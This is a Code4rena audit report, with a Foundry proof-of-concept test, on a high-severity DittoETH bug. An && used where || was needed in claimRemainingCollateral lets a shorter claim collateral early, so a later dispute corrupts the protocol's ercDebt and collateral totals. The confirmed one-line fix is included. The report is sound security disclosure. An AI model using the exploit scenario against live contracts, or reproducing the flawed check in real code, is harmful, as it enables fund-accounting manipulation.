---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/lending
protocol: "[[DittoETH]]"
auditors:
  - "[[Samuraii77]]"
report: "https://code4rena.com/reports/2024-03-dittoeth"
genome:
  - "[[wrong-condition]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[access-roles]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# [H-05] Flawed if check causes inaccurate tracking of the protocol's `ercDebt` and collateral

- id: 34175
- impact: HIGH
- protocol: [[DittoETH]]
- reporter: samuraii77 (Code4rena)
- source: https://code4rena.com/reports/2024-03-dittoeth

## Summary


The bug report discusses a flaw in the code that can potentially cause inaccurate values for important calculations in the protocol. This is caused by a mistake in the if check, which uses `&&` instead of `||` in the `RedemptionFacet::claimRemainingCollateral()` function. This can lead to a situation where a user can successfully claim collateral and delete a `shortRecord` without waiting for the required time. This can then lead to a discrepancy in the total collateral and `ercDebt` values for the asset. To fix this, the code should be updated to use `||` instead of `&&` in the if check.

## Details


A flawed if check using `&&` instead of `||` in `RedemptionFacet::claimRemainingCollateral()` leads to a break of one of the core protocol invariants. The total collateral and `ercDebt` of an asset should always equal the total collateral and `ercDebt` of all `shortRecords` combined. However, this will not be the case if the scenario explained below takes place. This results in the protocol holding inaccurate values of their `ercDebt` and collateral which are extremely important values used for very important calculations across the entire protocol.

### Proof of Concept

Imagine the following scenario:

1. `Shorter` has a few `shortRecords`.
2. `Redeemer` proposes a redemption for one of the `shortRecords` owned by `shorter`.
3. The `timeToDispute` passes.
4. `Redeemer2` proposes redemption for another one of the `shortRecords` owned by `shorter`.
5. Even though `timeToDispute` has not passed for `redeemer2`, `shorter` is able to call `RedemptionFacet::claimCollateral()` successfully because of a flawed if check.

```solidity
if (claimProposal.shorter != msg.sender && claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();
```

- 5.1 `Shorter` calls `RedemptionFacet::claimRemainingCollateral()` with the address of `redeemer` and with the ID of the `shortRecord` proposed by `redeemer2`.
- 5.2 `redeemerAssetUser` in the function is now `redeemer`.
- 5.3 The check for time to dispute passes as enough time has passed for `redeemer`'s `timeToDispute`.
- 5.4 `claimProposal` is the `decodedProposalData` of `redeemer`.
- 5.5 The if check doesn't lead to a revert because it is flawed, `claimProposal.shorter` is `==` to `msg.sender` as he is the owner of the initial `shortRecord`; however, the `claimProposal.shortId` is not equal to the given ID since `claimProposal.shortId` is based on the initial redeemer proposal and the given ID is the ID for the `shortRecord` proposed by `redeemer2` which makes the if check (true `&&` false) resulting in false and the code continues.
- 5.6 `_claimRemainingCollateral()` is called with the `shorter` address (`msg.sender`) and `shortId` equal to the given ID (ID of the `shortRecord` proposed by `redeemer2`).
- 5.7 Check successfully passes and `shorter` claims collateral and deletes `shortRecord` without having to wait the `timeToDispute`.

6. As the `shortRecord` is deleted before `timeToDispute` is over, `RedemptionFacet::disputeRedemption()` is still callable.
7. `Disputer` successfully disputes the already deleted `shortRecord`.
8. `RedemptionFacet::disputeRedemption()` gives back the `collateral` and `ercDebt` to the already deleted `shortRecord`.
9. It also increments the asset's `collateral` and `ercDebt`.

```solidity
for (uint256 i = incorrectIndex; i < decodedProposalData.length; i++) {
                currentProposal = decodedProposalData[i];

                STypes.ShortRecord storage currentSR = s.shortRecords[d.asset][currentProposal.shorter][currentProposal.shortId];
                currentSR.collateral += currentProposal.colRedeemed;
                currentSR.ercDebt += currentProposal.ercDebtRedeemed;

                d.incorrectCollateral += currentProposal.colRedeemed;
                d.incorrectErcDebt += currentProposal.ercDebtRedeemed;
            }

            s.vault[Asset.vault].dethCollateral += d.incorrectCollateral;
            Asset.dethCollateral += d.incorrectCollateral;
            Asset.ercDebt += d.incorrectErcDebt;
```

10. Since the `shortRecord` is deleted, it makes the asset's `ercDebt` and `collateral` inaccurate as it includes the `ercDebt` and `collateral` of a non-existent `shortRecord`.
11. Such inaccuracy is detrimental to the protocol as inaccurate values for the `ercDebt` and `collateral` will be used across the whole protocol for extremely important functions and calculations.

Add the following POC function to `Redemption.t.sol`:

<details>

```solidity
    function testRuinsDebtAndCollateralTracking() public {
        // Set up all of the users
        address shorter = sender;
        address redeemer = receiver;
        address redeemer2 = makeAddr('redeemer2');
        depositEth(redeemer2, INITIAL_ETH_AMOUNT);
        address disputer = makeAddr('disputer');

        for (uint256 i = 0; i < 6; i++) {
            if (i % 2 == 0) {
                fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, redeemer);
                fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, shorter);
            } else {
                fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, redeemer2);
                fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, shorter);
            }
        }

        _setETH(50000 ether);
        fundLimitBidOpt(DEFAULT_PRICE -  0.000000001 ether, DEFAULT_AMOUNT, redeemer2);
        fundLimitShortOpt(DEFAULT_PRICE -  0.000000001 ether, DEFAULT_AMOUNT, shorter);

        MTypes.ProposalInput[] memory redeemerProposalInputs = new MTypes.ProposalInput[](1);
        redeemerProposalInputs[0] = MTypes.ProposalInput({shorter: shorter, shortId: C.SHORT_STARTING_ID, shortOrderId: 0});

        _setETH(1000 ether);
        vm.prank(redeemer);
        diamond.proposeRedemption(asset, redeemerProposalInputs, DEF_REDEMPTION_AMOUNT, MAX_REDEMPTION_FEE); // Redeemer creates a proposal
        skip(diamond.getAssetUserStruct(asset, redeemer).timeToDispute); // Skip the time to dispute for the first proposal (5401 seconds)

        MTypes.ProposalInput[] memory redeemer2ProposalInputs = new MTypes.ProposalInput[](1);
        redeemer2ProposalInputs[0] = MTypes.ProposalInput({shorter: shorter, shortId: C.SHORT_STARTING_ID + 1, shortOrderId: 0});
        
        vm.prank(redeemer2);
        diamond.proposeRedemption(asset, redeemer2ProposalInputs, DEF_REDEMPTION_AMOUNT, MAX_REDEMPTION_FEE); // Redeemer2 creates a proposal

        assert(diamond.getOffsetTime() < diamond.getAssetUserStruct(asset, redeemer2).timeToDispute); // Not enough time has passed in order to redeem the second proposal (5402 < 10802)

        vm.expectRevert(Errors.TimeToDisputeHasNotElapsed.selector);
        vm.prank(redeemer2);
        diamond.claimRedemption(asset); // This correctly reverts as 5401 seconds have not passed and bug is non-existent in claimRedemption()

        STypes.ShortRecord[] memory shortRecordsBefore = diamond.getShortRecords(asset, shorter); // Get shortRecords before the deletion

        vm.prank(shorter);
        diamond.claimRemainingCollateral(asset, redeemer, 0, C.SHORT_STARTING_ID + 1); // Claiming collateral without waiting (this is the bug)

        STypes.ShortRecord[] memory shortRecordsAfter = diamond.getShortRecords(asset, shorter); // Get shortRecords after the deletion

        uint256 totalShortRecordsCollateralBefore;
        uint256 totalShortRecordsDebtBefore;

        for (uint256 i = 0; i < shortRecordsAfter.length; i++) { // Get the total collateral and total debt for the short records
            totalShortRecordsCollateralBefore += shortRecordsAfter[i].collateral;
            totalShortRecordsDebtBefore += shortRecordsAfter[i].ercDebt;
        }

        // Compare the total collateral and total debt based on the short records vs. based on the asset struct (they are equal as they should be)
        STypes.Asset memory assetStruct = diamond.getAssetStruct(asset);
        assertEq(totalShortRecordsCollateralBefore, assetStruct.dethCollateral); // 32500000000000000000
        assertEq(totalShortRecordsDebtBefore, assetStruct.ercDebt); // 20000000000000000000000

        assertEq(shortRecordsAfter.length, shortRecordsBefore.length - 1); // Deletion happened

        vm.prank(disputer);
        diamond.disputeRedemption(asset, redeemer2, 0, shorter, C.SHORT_STARTING_ID + 6); // Dispute with a shortRecord with a lower CR

        STypes.ShortRecord[] memory shortRecordsFinal = diamond.getShortRecords(asset, shorter); // Current short records

        STypes.Asset memory currentAssetStruct = diamond.getAssetStruct(asset); // Current asset struct

        uint256 currentTotalShortRecordsCollateral;
        uint256 currentTotalShortRecordsDebt;

        for (uint256 i = 0; i < shortRecordsFinal.length; i++) { // Get the total collateral and total debt for the short records
            currentTotalShortRecordsCollateral += shortRecordsFinal[i].collateral;
            currentTotalShortRecordsDebt += shortRecordsFinal[i].ercDebt;
        }

        assert(currentTotalShortRecordsDebt != currentAssetStruct.ercDebt); // 25000000000000000000000 30000000000000000000000
        assert(currentTotalShortRecordsCollateral != currentAssetStruct.dethCollateral); // 39999970000000000000 44999969999999999999
    }
```

</details>

### Recommended Mitigation Steps

Use `||` instead of `&&`

```diff
+ if (claimProposal.shorter != msg.sender || claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();
- if (claimProposal.shorter != msg.sender && claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();
```

### Assessed type

Invalid Validation

**[ditto-eth (DittoETH) confirmed](https://github.com/code-423n4/2024-03-dittoeth-findings/issues/104#issuecomment-2045984171)**

***
